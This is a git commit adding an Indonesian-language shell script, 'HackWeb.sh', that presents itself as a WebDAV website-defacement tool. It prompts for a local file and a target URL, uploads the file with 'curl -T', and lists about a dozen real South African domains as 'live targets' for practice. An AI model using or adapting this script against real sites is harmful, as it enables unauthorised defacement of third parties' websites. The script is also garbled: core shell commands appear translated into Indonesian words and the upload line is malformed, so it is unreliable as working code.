4ba5fb40193184310e5d881c7e7f4fde4b74df20
AnggaXploid <131685290+AnggaXploid@users.noreply.github.com>
2023-04-24 21:20:11 +0700

    Add files via upload

---
+++ HackWeb.sh
@@ -0,0 +1,25 @@
+# Hai! Ngapain exploit nano?
+#CODING SEDERHANA AJA MASA DI RECODE STER ^^
+#GUA EMANG GA PRO TAPI GUA BERUSAHA^^
+
+figlet -f miring AnggaXploit | lolcat
+
+gema   " _______________________________________________________________ "  | lolcat
+echo   " [JENIS : TOOLS DEFACE WEBDAV] "  | lolcat
+echo   " [PENULIS : AnggaXploit] "  | lolcat
+echo   " [ASOSIASI : ASOSIASI TERMUX INDONESIA] "  | lolcat
+echo   " [CATATAN : JADILAH ORANG PINTAR] "  | lolcat
+echo   " [TERIMAKASIH KEPADA : TUHAN] "  | lolcat
+gema   " _______________________________________________________________ "  | lolcat
+tidur 1
+
+echo  " ${y} [Live Target Pembelajaran : bitsandpieces.co.za cblandscapes.co.za windmillsandporcupines.co.za http://scnc.co.za http://contsol.co.za http://consultec. co.za http://colourfactory.co.za http://ayk.co.za http://daretogowildafrica.co.za http://floralandfresh.co.za http://foodconsult.co.za http: //itsengineering.co.za] "
+echo   " ${y} {1} MASUKAN NAMA SCRIPT [SIMPAN DI PENYIMPANAN,mis:index.html] ${endc} : "  | lolcat
+membaca sc
+gema
+echo  " ${y} {2} TARGET WEB MASUKAN "  | lolcat
+baca web
+curl -T /sdcard/ $sc  $web
+echo  " ${y} [OUTPUT]= "  $web / $sc  | lolcat
+
+# [Pengkodean oleh AnggaXploit]
